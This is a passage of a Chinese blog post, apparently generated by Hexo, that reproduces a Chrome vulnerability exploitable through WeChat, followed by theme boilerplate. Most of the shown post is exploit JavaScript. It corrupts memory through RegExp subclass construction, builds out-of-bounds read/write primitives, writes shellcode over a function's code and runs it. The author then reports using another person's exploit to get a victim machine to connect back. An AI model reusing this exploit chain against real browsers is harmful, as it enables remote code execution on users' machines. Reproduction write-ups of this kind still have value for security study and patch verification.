new RegExp(&#123; toString: function () &#123; return &#39;a&#39; &#125; &#125;);</span><br><span class="line">    cb(true);</span><br><span class="line"></span><br><span class="line">    class DerivedBase extends RegExp &#123;</span><br><span class="line">        constructor() &#123;</span><br><span class="line">            &#x2F;&#x2F; var array &#x3D; null;</span><br><span class="line">            super(</span><br><span class="line">                &#x2F;&#x2F; at this point, the 4-byte allocation for the JSRegExp &#96;this&#96; object</span><br><span class="line">                &#x2F;&#x2F; has just happened.</span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line">                &#125;, &#39;g&#39;</span><br><span class="line">                &#x2F;&#x2F; now the runtime JSRegExp constructor is called, corrupting the</span><br><span class="line">                &#x2F;&#x2F; JSArray.</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; this allocation will now directly follow the FixedArray allocation</span><br><span class="line">            &#x2F;&#x2F; made for &#96;this.data&#96;, which is where &#96;array.elements&#96; points to.</span><br><span class="line">            this_.buffer &#x3D; new ArrayBuffer(0x80);</span><br><span class="line">            g_array[8] &#x3D; this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; try&#123;</span><br><span class="line">    var derived_n &#x3D; eval(&#96;(function derived_n(i) &#123;</span><br><span class="line">        if (i &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return DerivedBase;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        class DerivedN extends derived_n(i-1) &#123;</span><br><span class="line">            constructor() &#123;</span><br><span class="line">                super();</span><br><span class="line">                return;</span><br><span class="line">                $&#123;&quot;this.a&#x3D;0;&quot;.repeat(tDerivedNCount)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return DerivedN;</span><br><span class="line">    &#125;)&#96;);</span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    new (derived_n(tDerivedNDepth))();</span><br><span class="line"></span><br><span class="line">    this.buffer_view &#x3D; new DataView(this.buffer);</span><br><span class="line">    this.leakPtr &#x3D; function (obj) &#123;</span><br><span class="line">        this.page_buffer.slot &#x3D; obj;</span><br><span class="line">        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.setPtr &#x3D; function (addr) &#123;</span><br><span class="line">        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.read32 &#x3D; function (addr) &#123;</span><br><span class="line">        this.setPtr(addr);</span><br><span class="line">        return this.page_view.getUint32(0, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.write32 &#x3D; function (addr, value) &#123;</span><br><span class="line">        this.setPtr(addr);</span><br><span class="line">        this.page_view.setUint32(0, value, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.write8 &#x3D; function (addr, value) &#123;</span><br><span class="line">        this.setPtr(addr);</span><br><span class="line">        this.page_view.setUint8(0, value, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.setBytes &#x3D; function (addr, content) &#123;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; content.length; i++) &#123;</span><br><span class="line">            this.write8(addr + i, content[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function trigger() &#123;</span><br><span class="line">    var oob &#x3D; oobAccess();</span><br><span class="line"></span><br><span class="line">    var func_ptr &#x3D; oob.leakPtr(target_function);</span><br><span class="line">    print(&#39;[*] target_function at 0x&#39; + func_ptr.toString(16));</span><br><span class="line"></span><br><span class="line">    var kCodeInsOffset &#x3D; 0x1b;</span><br><span class="line"></span><br><span class="line">    var code_addr &#x3D; oob.read32(func_ptr + kCodeInsOffset);</span><br><span class="line">    print(&#39;[*] code_addr at 0x&#39; + code_addr.toString(16));</span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line">    target_function(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    print(&quot;start running&quot;);</span><br><span class="line">    trigger();</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我本地测试不成功，不知道为啥，弹记事本都不行，奇怪</p>
+<p>最后用了白神的进行上线</p>
+<p>访问连接</p>
+<p><img src="/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
+<p>成功上线</p>
+<p><img src="/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
+<p>漏洞修复:全部升级为最新版</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/04/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">内网穿透方法总结</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2021
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/logo.png" alt="回梦&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+
+</html>
